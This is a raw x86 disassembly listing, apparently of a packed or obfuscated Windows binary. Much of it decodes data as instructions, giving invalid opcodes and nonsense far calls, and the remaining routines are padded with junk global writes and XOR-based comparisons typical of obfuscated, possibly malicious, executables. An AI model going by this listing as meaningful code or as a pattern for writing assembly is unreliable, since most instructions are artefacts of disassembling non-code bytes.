  41ad45:	rol    BYTE PTR [edi+edx*8+0x25367333],0x83
  41ad4d:	xor    ebx,DWORD PTR [ecx+0x50]
  41ad50:	dec    edi
  41ad51:	add    esp,DWORD PTR [esi-0x39]
  41ad54:	dec    ebp
  41ad55:	stos   DWORD PTR es:[edi],eax
  41ad56:	mov    cl,0x65
  41ad58:	sbb    bl,BYTE PTR [esi-0x24]
  41ad5b:	mov    esi,0x809a6814
  41ad60:	sbb    edx,esi
  41ad62:	dec    BYTE PTR [edx]
  41ad64:	and    al,0x95
  41ad66:	shl    BYTE PTR [edx],1
  41ad68:	pop    ds
  41ad69:	mov    ds:0xbfa63ae4,eax
  41ad6e:	jae    0x41ad61
  41ad70:	outs   dx,DWORD PTR ds:[esi]
  41ad71:	arpl   WORD PTR [edi+0x4c806578],bx
  41ad77:	push   cs
  41ad78:	clc    
  41ad79:	pushf  
  41ad7a:	ins    BYTE PTR es:[edi],dx
  41ad7b:	js     0x41adb8
  41ad7d:	sub    al,0x9f
  41ad7f:	push   ebx
  41ad80:	shl    DWORD PTR [edx-0x65],0x7f
  41ad84:	cmp    eax,0x364ff114
  41ad89:	and    bh,ah
  41ad8b:	xor    BYTE PTR [edi],ch
  41ad8d:	pop    ss
  41ad8e:	mov    ebp,0xdbe89bbe
  41ad93:	mov    WORD PTR [edi-0x3c324536],fs
  41ad99:	pusha  
  41ad9a:	dec    edx
  41ad9b:	add    BYTE PTR [eax-0x29],bl
  41ad9e:	shl    DWORD PTR [edx],0x6d
  41ada1:	xchg   ecx,eax
  41ada2:	(bad)  
  41ada3:	aaa    
  41ada4:	xchg   edi,eax
  41ada5:	and    al,ch
  41ada7:	les    esi,FWORD PTR [edx+ebp*8]
  41adaa:	sub    al,0x74
  41adac:	push   0xffffffbe
  41adae:	xchg   DWORD PTR [ebp-0x4d5af9cf],esi
  41adb4:	loop   0x41ade4
  41adb6:	cli    
  41adb7:	js     0x41ada9
  41adb9:	imul   eax,DWORD PTR [ebx],0x66
  41adbc:	cmp    DWORD PTR [ebx],esi
  41adbe:	jp     0x41ade5
  41adc0:	jg     0x41ad42
  41adc2:	jbe    0x41ad44
  41adc4:	xchg   BYTE PTR [ecx],dl
  41adc6:	ror    edi,cl
  41adc8:	mov    eax,DWORD PTR [edi-0x10]
  41adcb:	xor    BYTE PTR [esi],ah
  41adcd:	js     0x41adfc
  41adcf:	push   ebp
  41add0:	jae    0x41ae1f
  41add2:	sar    DWORD PTR [edx-0x22919995],0x9d
  41add9:	or     eax,ebp
  41addb:	xor    al,0x4
  41addd:	int3   
  41adde:	fisubr DWORD PTR [ecx+edi*1-0x2ab81940]
  41ade5:	stos   BYTE PTR es:[edi],al
  41ade6:	pop    ds
  41ade7:	and    ah,BYTE PTR [edi-0x3b]
  41adea:	in     eax,dx
  41adeb:	pop    ds
  41adec:	cmp    eax,ebp
  41adee:	call   0x91de:0xa57e7783
  41adf5:	adc    ecx,esp
  41adf7:	popf   
  41adf8:	mov    cl,0xf0
  41adfa:	leave  
  41adfb:	cs enter 0x2b7e,0xb1
  41ae00:	mov    edi,0xb4496e64
  41ae05:	xchg   ebx,eax
  41ae06:	into   
  41ae07:	xor    DWORD PTR [ecx+0x67],edi
  41ae0a:	dec    edx
  41ae0b:	jne    0x41ae3e
  41ae0d:	in     al,0x72
  41ae0f:	loopne 0x41ada3
  41ae11:	mov    ah,0x1c
  41ae13:	adc    DWORD PTR [eax],0xa5c5ab45
  41ae19:	inc    eax
  41ae1a:	push   esi
  41ae1c:	out    dx,al
  41ae1d:	jns    0x41ae63
  41ae1f:	add    bh,BYTE PTR [ebx-0x38]
  41ae22:	xchg   ecx,eax
  41ae23:	sbb    BYTE PTR [edi],ah
  41ae25:	add    BYTE PTR [ebx+0x1d2795fc],dh
  41ae2b:	mov    bh,0xa
  41ae2d:	ret    
  41ae2e:	or     dh,BYTE PTR [eax]
  41ae30:	aas    
  41ae31:	(bad)  
  41ae32:	(bad)  
  41ae33:	in     eax,dx
  41ae34:	dec    ecx
  41ae35:	stc    
  41ae36:	int    0x8e
  41ae38:	lock mov dh,BYTE PTR [eax+eax*1+0x24]
  41ae3d:	dec    esi
  41ae3e:	fistp  DWORD PTR [eax-0x78]
  41ae41:	jecxz  0x41ae31
  41ae43:	repz fwait
  41ae45:	jl     0x41ae07
  41ae47:	les    eax,FWORD PTR [ecx-0x2de128b5]
  41ae4d:	xchg   ebx,eax
  41ae4e:	popf   
  41ae4f:	ret    
  41ae50:	gs mov ah,0xb
  41ae53:	sub    edi,edx
  41ae55:	stos   DWORD PTR es:[edi],eax
  41ae56:	and    BYTE PTR [eax],bl
  41ae58:	add    DWORD PTR [edi-0x57],esp
  41ae5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae5c:	jmp    0x5186cb6a
  41ae61:	outs   dx,DWORD PTR ds:[esi]
  41ae62:	dec    edi
  41ae63:	cld    
  41ae64:	sub    eax,0x2ae1
  41ae69:	and    eax,0x6f90
  41ae6e:	mov    DWORD PTR [esp+0x30],eax
  41ae72:	mov    DWORD PTR [esp+0x10],0x1515
  41ae7a:	mov    eax,DWORD PTR [esp+0x10]
  41ae7e:	jmp    0x41b0db
  41ae83:	sub    al,0xff
  41ae85:	jmp    0xe1b3:0xbcbce956
  41ae8c:	in     al,0x38
  41ae8e:	xchg   edx,eax
  41ae8f:	pop    ebp
  41ae90:	iret   
  41ae91:	(bad)  
  41ae92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae93:	jecxz  0x41aec6
  41ae95:	sar    BYTE PTR [esi-0x41413dcb],0x98
  41ae9c:	xor    bl,dh
  41ae9e:	xchg   ebx,eax
  41ae9f:	adc    dl,BYTE PTR [ecx-0x2ae8f8b4]
  41aea5:	popf   
  41aea6:	(bad)  [edi-0x14e671ea]
  41aeac:	or     al,BYTE PTR [esp+eax*8+0x5b7147fd]
  41aeb3:	test   al,0x20
  41aeb5:	sbb    BYTE PTR [eax+edx*8+0x51],dl
  41aeb9:	fs aam 0x34
  41aebc:	mov    ds:0x151f28eb,eax
  41aec1:	mov    ds:0x3c3de0a6,eax
  41aec6:	out    0x9a,al
  41aec8:	pop    ebx
  41aec9:	rol    BYTE PTR [ebx+0x5270beb1],0x77
  41aed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aed1:	sbb    eax,0x53e6578c
  41aed6:	in     eax,dx
  41aed7:	test   DWORD PTR [ebp+0x285ae4e9],0x5674d6e7
  41aee1:	not    cl
  41aee3:	xchg   ebx,eax
  41aee4:	sbb    eax,0xe1b552de
  41aee9:	fistp  WORD PTR ds:0x6e33b993
  41aeef:	push   ebp
  41aef0:	cdq    
  41aef1:	dec    ecx
  41aef2:	fadd   DWORD PTR [edx]
  41aef4:	mov    ecx,0x9e6abc3a
  41aef9:	call   0x6a06:0x8c69f91e
  41af00:	dec    ebx
  41af01:	pop    esi
  41af02:	pop    ds
  41af03:	sbb    BYTE PTR [ecx-0x22],dh
  41af06:	sbb    BYTE PTR [edx-0x58b9a7d0],ch
  41af0c:	sub    al,0xbe
  41af0e:	fdivr  QWORD PTR [ebx+0x286c7ca2]
  41af14:	bound  ebp,QWORD PTR [ebx-0x6d0b661a]
  41af1a:	cdq    
  41af1b:	mov    ah,0x18
  41af1d:	into   
  41af1e:	cld    
  41af1f:	das    
  41af20:	xchg   edx,eax
  41af21:	push   esi
  41af22:	icebp  
  41af23:	sub    DWORD PTR [esi+0x2e5d2153],ebx
  41af29:	pusha  
  41af2a:	and    al,0xb7
  41af2c:	loop   0x41aed2
  41af2e:	adc    bh,ch
  41af30:	rol    edi,0xf
  41af33:	fimul  DWORD PTR [esi+0x4b]
  41af36:	iret   
  41af37:	jle    0x41af22
  41af39:	inc    esi
  41af3a:	mov    ah,0xb0
  41af3c:	fldcw  WORD PTR [edi+0x46]
  41af3f:	add    DWORD PTR [edi-0x2a],esp
  41af42:	mov    eax,0xcc0f8b95
  41af47:	imul   eax,esp,0x93169ae3
  41af4d:	fdivr  QWORD PTR [ebp+0x24]
  41af50:	push   ebp
  41af51:	push   ecx
  41af52:	stos   BYTE PTR es:[edi],al
  41af53:	mov    ch,0xc9
  41af55:	popf   
  41af56:	addr16 call 0xbfa0:0x9ce10ce7
  41af5e:	pop    eax
  41af5f:	sar    al,0x1a
  41af62:	sar    BYTE PTR gs:[ecx],1
  41af65:	sbb    esi,DWORD PTR [edx-0x2549570b]
  41af6b:	lods   eax,DWORD PTR ds:[esi]
  41af6c:	xor    DWORD PTR [ecx-0x36],esp
  41af6f:	mov    BYTE PTR [esi-0x3a62f99b],0x27
  41af76:	or     BYTE PTR ds:0x73d3faa7,al
  41af7c:	fnstcw WORD PTR [esi+0x5dd50986]
  41af82:	mov    al,ds:0xfcbf2a34
  41af87:	lea    ebp,[esi+0x74183272]
  41af8d:	sub    ah,BYTE PTR [ecx-0x2fabf364]
  41af93:	push   ss
  41af94:	push   0x59ef637f
  41af99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af9a:	and    bh,BYTE PTR [eax+eax*4-0x54848cd3]
  41afa1:	xchg   edi,eax
  41afa2:	pop    es
  41afa3:	cmp    bh,BYTE PTR [edx+0x1d462b94]
  41afa9:	jns    0x41b005
  41afab:	into   
  41afac:	test   al,0xf1
  41afae:	mov    edi,0x460c2adc
  41afb3:	inc    ecx
  41afb4:	cmp    esp,ebx
  41afb6:	outs   dx,BYTE PTR ds:[esi]
  41afb7:	mov    eax,0x441797d9
  41afbc:	fdivr  st(5),st
  41afbe:	cdq    
  41afbf:	icebp  
  41afc0:	cmp    BYTE PTR [edx],cl
  41afc2:	(bad)  
  41afc3:	repnz (bad) 
  41afc5:	out    dx,eax
  41afc6:	xchg   edx,eax
  41afc7:	int    0xf4
  41afc9:	scas   eax,DWORD PTR es:[edi]
  41afca:	clc    
  41afcb:	into   
  41afcc:	call   0x4fac99db
  41afd1:	das    
  41afd2:	mov    ah,dl
  41afd4:	or     eax,0xa7279dd4
  41afd9:	cmp    eax,0x42134194
  41afde:	(bad)  [edx-0x16]
  41afe1:	mov    ds:0x19379e6,eax
  41afe6:	fisttp QWORD PTR [ebx-0x5b]
  41afe9:	push   eax
  41afea:	(bad)  
  41afeb:	jmp    0x41b017
  41afed:	mov    esi,0x926e3ce1
  41aff2:	jbe    0x41af9b
  41aff4:	call   DWORD PTR [ebp-0x6c06fd8f]
  41affa:	mov    ds,WORD PTR [ecx-0x21]
  41affd:	cmp    DWORD PTR [ebp+0x46],edi
  41b000:	mov    ah,0xbf
  41b002:	retf   
  41b003:	repz sbb DWORD PTR [ebx],eax
  41b006:	or     eax,0x9ce19447
  41b00b:	stc    
  41b00c:	adc    al,0x55
  41b00e:	addr16 xor al,0xb6
  41b011:	test   BYTE PTR [edi+esi*8],cl
  41b014:	enter  0xaa4,0xa1
  41b018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b019:	adc    BYTE PTR [esi],cl
  41b01b:	jmp    0x3cdd:0xc8474a18
  41b022:	adc    eax,0xf5fb00dc
  41b027:	jbe    0x41b04f
  41b029:	loope  0x41afe8
  41b02b:	xor    bh,BYTE PTR [eax]
  41b02d:	mov    bl,0xb0
  41b02f:	dec    esi
  41b030:	std    
  41b031:	cld    
  41b032:	stc    
  41b033:	sbb    al,0x88
  41b035:	les    edi,FWORD PTR [eax-0x45b53732]
  41b03b:	inc    esi
  41b03d:	icebp  
  41b03e:	in     eax,dx
  41b03f:	and    dl,BYTE PTR [ebx-0x23]
  41b042:	jp     0x41b05a
  41b044:	mov    cl,0x55
  41b046:	ds add al,0x4b
  41b049:	test   ecx,ebx
  41b04b:	leave  
  41b04c:	clc    
  41b04d:	cwde   
  41b04e:	test   dh,ch
  41b050:	sbb    eax,0x74b511f8
  41b055:	push   ebp
  41b056:	enter  0x9176,0x76
  41b05a:	fbstp  TBYTE PTR [esi+0x77d736af]
  41b060:	dec    ecx
  41b061:	mov    ah,0x45
  41b063:	ss or  al,0xe0
  41b066:	jp     0x41aff2
  41b068:	shl    DWORD PTR [eax],1
  41b06a:	cmc    
  41b06b:	inc    ecx
  41b06c:	adc    al,0xe7
  41b06e:	dec    esi
  41b06f:	adc    al,BYTE PTR [eax]
  41b071:	mov    ecx,0xd7f2998f
  41b076:	adc    ecx,DWORD PTR [ecx]
  41b078:	pop    ds
  41b079:	add    ebp,DWORD PTR [ebp+ecx*8+0x1435f4f7]
  41b080:	(bad)  
  41b081:	jp     0x41b010
  41b083:	mov    esp,0xbf8338fb
  41b088:	fsub   DWORD PTR [esi+0x40]
  41b08b:	hlt    
  41b08c:	lock hlt 
  41b08e:	xchg   ebp,eax
  41b08f:	fisubr WORD PTR [ebx+edx*8-0x3d50c42]
  41b096:	jmp    0x2114:0x6e2e8bf9
  41b09d:	add    BYTE PTR [esi+esi*4-0x5e],0x3a
  41b0a2:	leave  
  41b0a3:	sub    DWORD PTR [esi-0x2c],ebx
  41b0a6:	mov    BYTE PTR [edi+0x5f],cl
  41b0a9:	mov    ebx,0xb6e0d4a4
  41b0ae:	xchg   ebx,eax
  41b0af:	es ins DWORD PTR es:[edi],dx
  41b0b1:	mov    bl,0xb3
  41b0b3:	push   edx
  41b0b4:	shl    BYTE PTR [ecx+0x27],0xc7
  41b0b8:	xor    dh,BYTE PTR es:[ecx+0xe]
  41b0bc:	jg     0x41b0c7
  41b0be:	mov    ecx,?
  41b0c0:	push   edi
  41b0c1:	lahf   
  41b0c2:	inc    BYTE PTR [eax+0x4ec3ea79]
  41b0c8:	test   BYTE PTR [ebx-0x74],ch
  41b0cb:	pushf  
  41b0cc:	and    bh,BYTE PTR [ebp+0x607f76ae]
  41b0d2:	jg     0x41b0e5
  41b0d4:	dec    edx
  41b0d5:	rol    BYTE PTR [eax-0x10],cl
  41b0d8:	xchg   esi,eax
  41b0d9:	cmc    
  41b0da:	in     al,0x8b
  41b0dc:	dec    esp
  41b0dd:	and    al,0x30
  41b0df:	or     eax,0x7113
  41b0e4:	add    eax,0x3d6a
  41b0e9:	cmp    ecx,eax
  41b0eb:	je     0x41b438
  41b0f1:	mov    eax,DWORD PTR [esp+0x40]
  41b0f5:	mov    edx,DWORD PTR [esp+0x18]
  41b0f9:	mov    edi,DWORD PTR [esp+0x1c]
  41b0fd:	xor    ecx,ecx
  41b0ff:	shld   ecx,eax,0x2
  41b103:	shl    eax,0x2
  41b106:	xor    eax,ebx
  41b108:	xor    ecx,esi
  41b10a:	cmp    eax,edx
  41b10c:	jne    0x41b11a
  41b112:	cmp    ecx,edi
  41b114:	je     0x41b3f1
  41b11a:	mov    eax,DWORD PTR [esp+0x44]
  41b11e:	mov    eax,DWORD PTR [esp+0x44]
  41b122:	mov    eax,DWORD PTR [esp+0x44]
  41b126:	mov    ecx,DWORD PTR [esp+0x44]
  41b12a:	jmp    0x41b387
  41b12f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b131:	lea    ecx,[ecx-0x67]
  41b134:	jnp    0x41b171
  41b136:	mov    bh,0x0
  41b138:	lods   al,BYTE PTR ds:[esi]
  41b139:	dec    esp
  41b13a:	xchg   edx,eax
  41b13b:	das    
  41b13c:	(bad)  
  41b13d:	fs sahf 
  41b13f:	pop    esp
  41b140:	xor    eax,0xc235bec0
  41b145:	mov    esi,0x4dfb4fbe
  41b14a:	mov    ebp,eax
  41b14c:	lods   al,BYTE PTR ds:[esi]
  41b14d:	xor    eax,0x93a9d9cb
  41b152:	pop    eax
  41b153:	shl    BYTE PTR [ecx+eax*8+0x24ada206],0x26
  41b15b:	push   ebp
  41b15c:	jnp    0x41b196
  41b15e:	pusha  
  41b15f:	gs add al,0xe6
  41b162:	sub    eax,0x8c59d610
  41b167:	and    ah,BYTE PTR [esi-0xfa45034]
  41b16d:	pop    esi
  41b16e:	or     ecx,DWORD PTR [esi+esi*8+0x1d585b4d]
  41b175:	or     eax,DWORD PTR [esi]
  41b177:	sbb    al,0x99
  41b179:	jge    0x41b108
  41b17b:	addr16 imul esp,eax,0xbe62717b
  41b182:	test   eax,0xa2142718
  41b188:	mov    bl,0x1c
  41b18a:	mov    al,0x14
  41b18c:	(bad)  
  41b18d:	scas   al,BYTE PTR es:[edi]
  41b18e:	jae    0x41b18e
  41b190:	test   DWORD PTR [esi+ebx*8-0x2320e3bf],ebp
  41b197:	push   0x17c6ad79
  41b19c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b19d:	dec    edi
  41b19e:	in     eax,dx
  41b19f:	xchg   ecx,eax
  41b1a0:	jb     0x41b15b
  41b1a2:	jno    0x41b1f0
  41b1a4:	jmp    0x41b1d8
  41b1a6:	mov    ah,0xee
  41b1a8:	jo     0x41b1b7
  41b1aa:	jl     0x41b1a2
  41b1ac:	cdq    
  41b1ad:	lahf   
  41b1ae:	sbb    DWORD PTR [edi+0x723c6f1c],ecx
  41b1b4:	mov    dl,0x38
  41b1b6:	loop   0x41b222
  41b1b8:	adc    eax,0x3c75ecc4
  41b1bd:	pop    ds
  41b1be:	push   ebp
  41b1bf:	push   0xee5d5f0e
  41b1c4:	add    BYTE PTR [ebp+0x760902b7],dl
  41b1ca:	sub    ebp,DWORD PTR [esi-0x2c]
  41b1cd:	imul   ebx,ecx,0xfffffffa
  41b1d0:	pushf  
  41b1d1:	enter  0x4100,0x94
  41b1d5:	pop    ebp
  41b1d6:	adc    eax,0x2a04a56e
  41b1db:	dec    eax
  41b1dc:	sub    al,0xe1
  41b1de:	xor    ebp,DWORD PTR [esi+0x5f9731bd]
  41b1e4:	jmp    0x5f13:0x8659e4
  41b1eb:	popf   
  41b1ec:	xchg   edi,eax
  41b1ed:	mov    ch,0xc5
  41b1ef:	xchg   ebp,eax
  41b1f0:	dec    BYTE PTR [edi]
  41b1f2:	fwait
  41b1f3:	fs xor ah,bl
  41b1f6:	mov    ah,0xca
  41b1f8:	xchg   ebp,eax
  41b1f9:	loop   0x41b20b
  41b1fb:	mov    al,ds:0xbbcf242c
  41b200:	out    0xf,eax
  41b202:	mov    edx,0x21907ee8
  41b207:	jp     0x87727643
  41b20d:	popf   
  41b20e:	and    al,BYTE PTR [edx+edx*4-0x4e]
  41b212:	sahf   
  41b213:	(bad)  [ecx+0x1f259e1]
  41b219:	rcr    BYTE PTR [ebp-0x5d],1
  41b21c:	stos   BYTE PTR es:[edi],al
  41b21d:	setne  cl
  41b220:	xchg   DWORD PTR [edi-0x17],ebp
  41b223:	jl     0x41b277
  41b225:	jg     0x41b248
  41b227:	je     0x41b1c6
  41b229:	jo     0x41b1c1
  41b22b:	mov    bl,0x3c
  41b22d:	push   ecx
  41b22e:	bound  ecx,QWORD PTR [edi]
  41b230:	std    
  41b231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b232:	sbb    al,0xf8
  41b234:	adc    dh,BYTE PTR [eax-0x58]
  41b237:	or     al,0x6
  41b239:	inc    edi
  41b23a:	or     BYTE PTR [edx-0x337514ce],bh
  41b240:	rcl    DWORD PTR [ebp+0x5b5a31be],1
  41b246:	dec    ebx
  41b247:	int3   
  41b248:	mov    WORD PTR [esi-0x32ef4787],gs
  41b24e:	mov    ah,0xda
  41b250:	push   esp
  41b251:	jmp    0xce55e230
  41b256:	cwde   
  41b257:	inc    esp
  41b258:	das    
  41b259:	mov    bl,0xcc
  41b25b:	cmp    edx,0x71920547
  41b261:	(bad)  [esi-0x858033d]
  41b267:	inc    esp
  41b268:	out    0x77,al
  41b26a:	lahf   
  41b26b:	out    0xc6,eax
  41b26d:	pop    ds
  41b26e:	gs call 0xa891:0x3312224
  41b276:	xchg   esp,eax
  41b277:	retf   
  41b278:	push   eax
  41b279:	jne    0x41b204
  41b27b:	mov    bl,0x4e
  41b27d:	xchg   edi,eax
  41b27e:	daa    
  41b27f:	adc    DWORD PTR [ebp+0x3c],edx
  41b282:	add    ebx,DWORD PTR [edx-0x349bed3a]
  41b288:	adc    eax,0xe09977f2
  41b28d:	daa    
  41b28e:	rcl    DWORD PTR [esi-0x4c450c29],0x21
  41b295:	std    
  41b296:	pop    ebx
  41b297:	and    DWORD PTR fs:[eax-0x6d0b490b],eax
  41b29e:	lahf   
  41b29f:	pop    edi
  41b2a0:	and    al,0x6
  41b2a2:	fdivr  QWORD PTR [edx-0x734a4019]
  41b2a8:	cmp    eax,0xf74d3ffa
  41b2ad:	mov    al,ds:0x4d417859
  41b2b2:	mov    eax,ds:0x4547560c
  41b2b7:	sub    DWORD PTR [edi-0x35],eax
  41b2ba:	xor    cl,BYTE PTR [edi+0x15]
  41b2bd:	pop    ebx
  41b2be:	pop    eax
  41b2bf:	and    DWORD PTR [edx-0x31],0x1c
  41b2c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2c4:	push   esp
  41b2c5:	cdq    
  41b2c6:	jo     0x41b2cc
  41b2c8:	dec    ebp
  41b2c9:	jg     0x41b2cf
  41b2cb:	out    dx,eax
  41b2cc:	mov    ebx,0xd8a1728d
  41b2d1:	push   cs
  41b2d2:	xchg   ecx,eax
  41b2d3:	xlat   BYTE PTR ds:[ebx]
  41b2d4:	hlt    
  41b2d5:	cmp    al,0x32
  41b2d7:	in     eax,dx
  41b2d8:	sbb    ch,BYTE PTR [ebp+0x24bf1c6a]
  41b2de:	dec    edi
  41b2df:	ins    DWORD PTR es:[edi],dx
  41b2e0:	into   
  41b2e1:	pushf  
  41b2e2:	pop    eax
  41b2e3:	and    ch,BYTE PTR [eax+0x1a06357b]
  41b2e9:	stc    
  41b2ea:	not    BYTE PTR [ebx-0x4b]
  41b2ed:	ffreep st(6)
  41b2ef:	sahf   
  41b2f0:	cs stos DWORD PTR es:[edi],eax
  41b2f2:	test   BYTE PTR [ebp-0x5c],ch
  41b2f5:	inc    ebp
  41b2f6:	and    al,0x4b
  41b2f8:	mov    bl,0xab
  41b2fa:	sub    eax,0x1e6d8749
  41b2ff:	inc    ecx
  41b300:	add    eax,0xa3c0e7f
  41b305:	jo     0x41b2dc
  41b307:	jmp    0x13bf:0xa8ff92d
  41b30e:	mov    ebx,0x1ad8781c
  41b313:	sub    ch,BYTE PTR [esi-0x59d8ef50]
  41b319:	pop    ebx
  41b31a:	add    al,0x2c
  41b31c:	sbb    eax,0xb05fa27b
  41b321:	retf   
  41b322:	popf   
  41b323:	leave  
  41b324:	(bad)  
  41b325:	jmp    0x30e8:0xc2c99e7e
  41b32c:	dec    esp
  41b32d:	in     eax,0xc4
  41b32f:	jno    0x41b302
  41b331:	push   ebp
  41b332:	pop    eax
  41b333:	div    DWORD PTR [edx+0xa372841]
  41b339:	aad    0x4
  41b33b:	out    dx,al
  41b33c:	sub    eax,0xe57e2370
  41b341:	pop    edi
  41b342:	or     eax,0xd466f2f7
  41b347:	test   ah,0xf7
  41b34a:	xchg   ebp,eax
  41b34b:	add    BYTE PTR [edi],bh
  41b34d:	fimul  DWORD PTR [edi-0x6ecb4578]
  41b353:	xchg   ebx,eax
  41b354:	pop    edi
  41b355:	sar    DWORD PTR [edx+ebp*1],1
  41b358:	pop    ebp
  41b359:	adc    esp,DWORD PTR [eax]
  41b35b:	call   0xfe:0x425d2441
  41b362:	call   0xea36:0xb7aa4dd
  41b369:	jecxz  0x41b310
  41b36b:	stc    
  41b36c:	jmp    0x41b3d0
  41b36e:	push   es
  41b36f:	push   ecx
  41b370:	sbb    DWORD PTR [ecx+0x4f4df9fd],ebp
  41b376:	sbb    eax,0xa4e17cd0
  41b37b:	mov    ebx,esi
  41b37d:	adc    ecx,eax
  41b37f:	mov    ebp,0x205f7e8c
  41b384:	mov    WORD PTR [edx],ds
  41b386:	mov    eax,ds:0x69baf35
  41b38b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b38c:	xor    ecx,0xfffffffe
  41b38f:	shr    eax,0x2
  41b392:	shl    ecx,0x1e
  41b395:	or     eax,ecx
  41b397:	xor    ecx,ecx
  41b399:	shld   ecx,eax,0x2
  41b39d:	shl    eax,0x2
  41b3a0:	xor    eax,ebx
  41b3a2:	xor    ecx,esi
  41b3a4:	cmp    eax,0xcb79b572
  41b3a9:	jne    0x41b3b7
  41b3af:	cmp    ecx,esi
  41b3b1:	je     0x41b438
  41b3b7:	mov    eax,DWORD PTR [esp+0x60]
  41b3bb:	cdq    
  41b3bc:	mov    eax,DWORD PTR [esp+0x60]
  41b3c0:	mov    ecx,edx
  41b3c2:	cdq    
  41b3c3:	shld   edx,eax,0x2
  41b3c7:	shr    ecx,0x1e
  41b3ca:	xor    edi,edi
  41b3cc:	shl    eax,0x2
  41b3cf:	or     eax,ecx
  41b3d1:	or     edx,edi
  41b3d3:	mov    ecx,edx
  41b3d5:	mov    edx,DWORD PTR [esp+0x18]
  41b3d9:	xor    eax,ebx
  41b3db:	xor    ecx,esi
  41b3dd:	mov    esi,DWORD PTR [esp+0x1c]
  41b3e1:	cmp    edx,eax
  41b3e3:	jne    0x41b3f1
  41b3e9:	cmp    esi,ecx
  41b3eb:	je     0x41b438
  41b3f1:	push   DWORD PTR ds:0x4227e8
  41b3f7:	push   DWORD PTR ds:0x42257c
  41b3fd:	mov    eax,ds:0x4226f8
  41b402:	mov    eax,DWORD PTR [eax+0x1a4]
  41b408:	push   DWORD PTR [eax]
  41b40a:	mov    eax,DWORD PTR [esp+0x78]
  41b40e:	call   eax
  41b410:	mov    ecx,DWORD PTR ds:0x4226f8
  41b416:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41b41c:	mov    DWORD PTR [ecx],eax
  41b41e:	mov    eax,ds:0x4226f8
  41b423:	push   0x4
  41b425:	add    eax,0x1dc
  41b42a:	push   eax
  41b42b:	lea    eax,[esp+0x84]
  41b432:	push   eax
  41b433:	call   0x411c08
  41b438:	mov    eax,DWORD PTR [esp+0x7c]
  41b43c:	mov    eax,DWORD PTR [eax]
  41b43e:	pop    edi
  41b43f:	pop    esi
  41b440:	pop    ebx
  41b441:	mov    esp,ebp
  41b443:	pop    ebp
  41b444:	ret    0xc
  41b447:	push   ebp
  41b448:	mov    ebp,esp
  41b44a:	sub    esp,0x23c
  41b450:	push   ebx
  41b451:	cmp    DWORD PTR ds:0x428555,0x0
  41b458:	mov    DWORD PTR ds:0x42833d,0x2d97
  41b462:	mov    ecx,DWORD PTR ds:0x428455
  41b468:	mov    ecx,DWORD PTR ds:0x428429
  41b46e:	not    ecx
  41b470:	jmp    0x41b4da
  41b475:	mov    eax,ds:0x428471
  41b47a:	cmp    DWORD PTR ds:0x428555,0x0
  41b481:	jge    0x41b4c9
  41b487:	push   0x73dd
  41b48c:	push   DWORD PTR [ebp-0x18]
  41b48f:	push   0x4282e3
  41b494:	push   DWORD PTR [ebp-0x10]
  41b497:	push   DWORD PTR [ebp-0x14]
  41b49a:	call   DWORD PTR ds:0x42e108
  41b4a0:	neg    ecx
  41b4a2:	movzx  ecx,WORD PTR ds:0x428351
  41b4a9:	sbb    ecx,DWORD PTR ds:0x428441
  41b4af:	mov    DWORD PTR ds:0x428351,ecx
  41b4b5:	and    ecx,DWORD PTR ds:0x428561
  41b4bb:	xor    ecx,ecx
  41b4bd:	or     ecx,DWORD PTR ds:0x428461
  41b4c3:	or     DWORD PTR ds:0x4284d5,ecx
  41b4c9:	adc    ecx,ecx
  41b4cb:	xor    ecx,ecx
  41b4cd:	movzx  ecx,BYTE PTR ds:0x428401
  41b4d4:	or     DWORD PTR ds:0x428409,ecx
  41b4da:	push   esi
  41b4db:	push   edi
  41b4dc:	cmp    DWORD PTR ds:0x42856d,0x0
  41b4e3:	mov    ecx,0x4e26
  41b4e8:	mov    DWORD PTR ds:0x428561,ebx
  41b4ee:	mov    DWORD PTR ds:0x42840d,ecx
  41b4f4:	mov    DWORD PTR ds:0x4284dd,edx
  41b4fa:	jmp    0x41b569
  41b4ff:	mov    DWORD PTR ds:0x428361,0x7065
  41b509:	cmp    DWORD PTR ds:0x42856d,0x0
  41b510:	jae    0x41b54d
  41b516:	push   0x1ec2
  41b51b:	push   DWORD PTR [ebp-0x10]
  41b51e:	push   DWORD PTR [ebp-0x10]
  41b521:	push   0x8dff
  41b526:	push   DWORD PTR [ebp-0x18]
  41b529:	push   0x428565
  41b52e:	call   DWORD PTR ds:0x42e290
  41b534:	xor    ecx,0x4175
  41b53a:	movzx  ecx,BYTE PTR ds:0x428459
  41b541:	or     ecx,DWORD PTR ds:0x42841d
  41b547:	mov    DWORD PTR ds:0x428459,ecx
  41b54d:	add    DWORD PTR ds:0x4283f9,edx
  41b553:	adc    ecx,0x68aa
  41b559:	add    DWORD PTR ds:0x428341,0x591d
  41b563:	dec    DWORD PTR ds:0x428471
  41b569:	mov    DWORD PTR [ebp-0x50],0x1
  41b570:	cmp    DWORD PTR ds:0x42856d,0x0
  41b577:	not    ecx
  41b579:	mov    DWORD PTR ds:0x428351,0x24a
  41b583:	jmp    0x41b5df
  41b588:	mov    DWORD PTR ds:0x428359,0x4cf4
  41b592:	mov    eax,0x7057
  41b597:	cmp    DWORD PTR ds:0x42856d,0x0
  41b59e:	jl     0x41b5c3
  41b5a4:	push   DWORD PTR [ebp-0xc]
  41b5a7:	call   DWORD PTR ds:0x42e10c
  41b5ad:	adc    ecx,DWORD PTR ds:0x42841d
  41b5b3:	sbb    DWORD PTR ds:0x428441,0x4277
  41b5bd:	and    DWORD PTR ds:0x4284c5,ecx
  41b5c3:	and    ecx,ecx
  41b5c5:	or     DWORD PTR ds:0x428465,0x5b0f
  41b5cf:	sbb    ecx,0x33b5
  41b5d5:	sub    DWORD PTR ds:0x42843d,0xb05
  41b5df:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41b5e9:	xor    DWORD PTR ds:0x428359,0x1f8b
  41b5f3:	mov    DWORD PTR [ebp-0xb8],0x1
